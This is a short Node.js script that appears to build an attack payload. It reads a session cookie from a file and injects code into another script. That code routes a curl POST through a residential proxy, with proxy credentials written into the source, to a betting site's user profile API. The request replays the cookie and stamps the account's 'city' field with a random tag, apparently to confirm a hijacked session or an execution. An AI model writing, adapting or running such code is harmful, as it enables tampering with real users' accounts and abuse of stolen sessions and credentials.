const fs=require('fs');
let t=fs.readFileSync('p1.js','utf8');
const ck=fs.readFileSync('..\\ck.txt','utf8');
const tag='RP'+Math.floor(Math.random()*90000+10000);
const code=`
const net=require('net'),cp=require('child_process');
const PG='http://ud0fapk7ut9-country-europe-speed-fast-quality-high-session-cap01:jw0sn5ge1677@resi-bridge-eu.rainproxy.io:3333';
const s=net.connect(3333,'resi-bridge-eu.rainproxy.host'.replace('.host','.io'));
s.setTimeout(4000);
let done=false;
const fin=ok=>{ if(done)return; done=true; try{s.destroy()}catch(e){}; if(!ok)return;
  cp.spawnSync('curl',['-s','-m','12','-x',PG,'-X','POST','-H','content-type: application/json','-H','cookie: ${ck}','-d','{"city":"${tag}"}','https://titobet.com/api/user/profile']); };
s.on('connect',()=>fin(true)); s.on('error',()=>fin(false)); s.on('timeout',()=>fin(false));
`;
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('tag='+tag);
